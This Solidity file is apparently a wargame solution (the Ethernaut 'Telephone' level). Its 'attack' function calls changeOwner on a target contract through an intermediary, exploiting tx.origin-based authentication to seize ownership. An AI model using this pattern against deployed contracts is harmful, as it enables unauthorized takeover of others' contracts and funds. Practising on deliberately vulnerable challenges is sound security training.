pragma solidity 0.8.7;

interface ITelephone{
    function changeOwner(address _owner) external;
}

contract level4 {

    ITelephone public surface;

    constructor() {
        surface = ITelephone(0x8AC9ca0984412656046305de3B163CFcd662F2FB);
    }

    function attack() external {
        address _address = msg.sender;
        surface.changeOwner(_address);
    }
}